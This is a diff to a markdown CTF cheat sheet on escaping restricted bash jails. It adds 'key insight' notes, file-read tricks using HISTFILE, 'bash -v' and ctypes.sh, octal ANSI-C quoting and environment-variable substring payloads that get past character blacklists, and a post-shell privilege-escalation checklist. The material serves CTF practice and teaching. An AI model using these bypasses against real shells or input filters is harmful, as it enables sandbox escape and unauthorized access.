@@ -3,14 +3,16 @@
 ## Table of Contents
 - [Identifying the Jail](#identifying-the-jail)
 - [Eval Context Detection](#eval-context-detection)
-- [Character-Restricted Bash: Only `#`, `$`, `\`](#character-restricted-bash-only)
+- [Character-Restricted Bash: Only #, $, \](#character-restricted-bash-only---)
 - [Internal Service Discovery (Post-Shell)](#internal-service-discovery-post-shell)
 - [Other Restricted Character Set Tricks](#other-restricted-character-set-tricks)
-  - [Building numbers from `$#` and `${##}`](#building-numbers-from--and)
+  - [Building numbers from $# and ${##}](#building-numbers-from--and-)
   - [Using PID digits](#using-pid-digits)
   - [Octal in ANSI-C quoting](#octal-in-ansi-c-quoting)
   - [Dollar-zero variants](#dollar-zero-variants)
 - [Privilege Escalation Checklist (Post-Shell)](#privilege-escalation-checklist-post-shell)
+- [HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)](#histfile-trick-for-restricted-shell-file-reads-bctf-2016)
+- [Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)](#bash-jail-bypass-via--octal-encoding-34c3-ctf-2017)
 - [References](#references)
 
 ---
@@ -43,6 +45,8 @@ for c in range(32, 127):
 
 **Silent rejection = character not allowed.** Error output = character passed the filter.
 
+**Key insight:** Systematically probe each printable character to map the allowed set before crafting payloads. Silent rejection means the character is filtered; any error output means it passed the filter and reached the shell.
+
 ---
 
 ## Eval Context Detection
@@ -60,6 +64,8 @@ for c in range(32, 127):
 **Read behavior:**
 - `read -r`: backslashes preserved literally
 - `read` (without -r): backslash is escape character (strips backslashes)
+
+**Key insight:** Distinguish between `eval "$input"` (double-quoted) and `eval $input` (bare) by sending a trailing backslash. Double-quoted eval produces an "unexpected EOF" error because the backslash escapes the closing quote; bare eval does not. This determines which escape sequences are available for exploitation.
 
 ---
 
@@ -121,6 +127,8 @@ cat < /dev/tcp/127.0.0.1/PORT
 nc 127.0.0.1 PORT
 ```
 
+**Key insight:** After escaping the jail, check `/proc/*/cmdline` for internal services serving the flag on localhost. The flag is often on a different process, not readable from the filesystem directly.
+
 ---
 
 ## Other Restricted Character Set Tricks
@@ -149,6 +157,8 @@ If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`
 | interactive | `bash` or `-bash` |
 | sh | `sh` |
 
+**Key insight:** Build arbitrary strings from minimal character sets by combining `$#` (yields 0), `${##}` (yields 1), `$$` (PID digits), and ANSI-C quoting (`$'\NNN'` for octal). Even a 3-character alphabet (`#$\`) is sufficient to spawn a shell via `$0` expansion.
+
 ---
 
 ## Privilege Escalation Checklist (Post-Shell)
@@ -159,6 +169,55 @@ If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`
 4. **Process UIDs:** `cat /proc/*/status 2>/dev/null | grep -A5 "^Name:.*flag"`
 5. **Writable paths:** Check if PATH contains writable dirs
 6. **Docker/container:** `/dev/tcp` for internal service access, `/.dockerenv` presence
+
+**Key insight:** After escaping the jail, run through this checklist in order: SUID binaries and capabilities first (quickest wins), then internal services via `/proc/*/cmdline`, then writable PATH directories. In containers, use `/dev/tcp` for internal service access since netcat is rarely available.
+
+---
+
+## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)
+
+Read arbitrary files in restricted bash shells without cat/less/head:
+
+```bash
+# Method 1: HISTFILE loading
+HISTFILE=/path/to/flag /bin/bash
+history  # Flag contents loaded as command history
+
+# Method 2: bash verbose mode
+bash -v flag.txt  # Prints each line before executing; comments (#flag{...}) print without error
+
+# Method 3: ctypes.sh direct C library calls
+dlcall -n fd open /flag 0
+dlcall -n m mmap 0 100 1 1 $fd 0
+dlcall printf %s $m
+```
+
+**Key insight:** Three ways to read files without standard utilities: (1) HISTFILE loading, (2) `bash -v` verbose mode, (3) `ctypes.sh` direct C library calls via `dlcall`.
+
+---
+
+## Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)
+
+When a-z, `*`, `?`, `.` are banned, use `$'...'` ANSI-C quoting with octal escapes:
+
+```bash
+# Encode /get_flag as octal
+__=$'\057\147\145\164\137\146\154\141\147'
+$__  # executes /get_flag
+
+# Or encode any command character by character:
+# /bin/sh = $'\057\142\151\156\057\163\150'
+```
+
+Also: extract characters from existing environment variables:
+
+```bash
+# ${VARIABLE:START:LENGTH} extracts substrings
+# Build command from $PATH, $HOME, $OSTYPE, $HOSTNAME:
+/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}...
+```
+
+**Key insight:** Bash's `$'...'` syntax interprets `\NNN` as octal byte values, allowing arbitrary string construction without using any alphabetic characters. Combined with environment variable substring extraction (`${VAR:offset:length}`), this bypasses nearly any character blacklist. The `__` variable name uses only underscores (often not blocked). When letters are banned but `$`, `'`, `\`, and digits are allowed, octal encoding in ANSI-C quotes is the primary escape vector.
 
 ---
 
